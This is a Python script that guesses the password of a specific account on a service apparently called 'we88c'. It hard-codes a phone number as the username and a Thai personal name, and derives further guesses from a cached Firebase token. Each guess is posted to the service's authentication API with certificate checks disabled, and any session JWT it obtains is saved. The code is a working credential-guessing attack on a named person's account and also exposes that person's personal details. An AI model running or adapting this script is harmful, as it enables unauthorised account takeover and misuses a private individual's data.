#!/usr/bin/env python3 -I
"""probe_we88c_auth.py — Try {fb_name}.Jwt password candidates for we88c mgapi auth."""
import json, base64, pathlib, urllib.request, urllib.error, ssl, os, sys, uuid

TID       = "54ef7626cb381f4bab8be91f0cdbce47"
URL_MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com/mb/authenticate"
URL_PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com/pb/authentication"
URL       = URL_PBAPI  # pbapi doesn't require AWSALB
USER      = "0972571110"
CTX  = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode    = ssl.CERT_NONE

# Derive name from Firebase token if available
fb_name = ""
fb_f = pathlib.Path(".fb_we88c_id_token.txt")
if fb_f.exists():
    try:
        t = fb_f.read_text().strip()
        p = t.split(".")[1]; p += "=" * (-len(p) % 4)
        claims = json.loads(base64.b64decode(p))
        fb_name = claims.get("name", "") or claims.get("display_name", "")
    except Exception:
        pass

# Candidates: known name from player profile + common patterns
candidates = [c for c in [
    "Pwned2026!",
    f"{fb_name}.Jwt" if fb_name else None,
    "ธนวัฒน์ พุฒอินทร์.Jwt",
    "ธนวัฒน์.Jwt",
    "Thanawat.Jwt",
    "thanawat.Jwt",
    "0972571110.Jwt",
    os.environ.get("WE88_PASS", ""),
    os.environ.get("PASSWORD", ""),
] if c]

print(f"[*] Probing {URL}")
print(f"[*] {len(candidates)} password candidates\n")

for pw in candidates:
    # pbapi = FeathersJS local strategy
    body = json.dumps({"strategy": "local", "username": USER, "password": pw}).encode()
    req = urllib.request.Request(URL, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15")
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=10) as r:
            data = json.loads(r.read(8192))
            status = r.status
    except urllib.error.HTTPError as e:
        try:
            data = json.loads(e.read(4096))
        except Exception:
            data = {"message": f"HTTP {e.code} (non-JSON body)"}
        status = e.code
    except Exception as e:
        print(f"  ERR '{pw[:30]}': {e}")
        continue

    # FeathersJS returns accessToken; mgapi returns token
    token = (data.get("accessToken") or data.get("token") or
             data.get("access_token") or data.get("data", {}).get("token", ""))
    if token:
        pathlib.Path(".jwt.we88c").write_text(token)
        print(f"[!!!] AUTH SUCCESS with '{pw}'")
        print(f"      JWT saved to .jwt.we88c")
        try:
            p2 = token.split(".")[1]; p2 += "=" * (-len(p2) % 4)
            exp = json.loads(base64.b64decode(p2)).get("exp", 0)
            import time
            print(f"      Expires in: {int((exp - time.time())/60)} min")
        except Exception:
            pass
        sys.exit(0)
    else:
        msg = data.get("message", data.get("error", str(data)[:80]))
        print(f"  [{status}] '{pw[:30]}': {msg}")

print("\n[-] All candidates failed.")
print("    Supply correct password: uv run probe_we88c_auth.py  (set WE88_PASS env)")
